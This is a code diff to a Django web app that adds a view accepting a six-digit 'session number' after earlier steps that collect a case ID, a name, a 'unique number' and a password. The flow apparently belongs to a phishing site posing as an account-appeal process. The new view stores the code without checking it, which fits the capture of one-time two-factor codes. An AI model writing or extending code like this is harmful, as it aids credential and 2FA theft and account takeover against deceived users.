@@ -1,7 +1,7 @@
 # main/views.py
 from django.shortcuts import render, redirect
 from django.contrib import messages
-from .models import UserSubmission
+from .models import UserSubmission, SessionVerification
 
 VALID_CASE_IDS = {
     'APL-2024-1234',
@@ -72,3 +72,28 @@ def idpassword(request):
         return redirect('confirmation')  # Create this view next
 
     return render(request, 'main/idpassword.html')
+
+def collect_session_number(request):
+    # Verify previous steps through session
+    required_session_flags = [
+        'verified_case',
+        'accepted_terms',
+        'collected_name',
+        'collected_unique_number'
+    ]
+    
+    if not all(request.session.get(flag) for flag in required_session_flags):
+        return redirect('index')
+
+    if request.method == 'POST':
+        session_number = request.POST.get('code', '').strip()
+        
+        if len(session_number) == 6 and session_number.isdigit():
+            SessionVerification.objects.create(session_number=session_number)
+            request.session['session_verified'] = True
+            messages.success(request, "Session number successfully recorded!")
+            return redirect('next_step')  # Replace with your actual next step
+            
+        messages.error(request, "Invalid session number format")
+    
+    return render(request, 'main/session_verification.html')
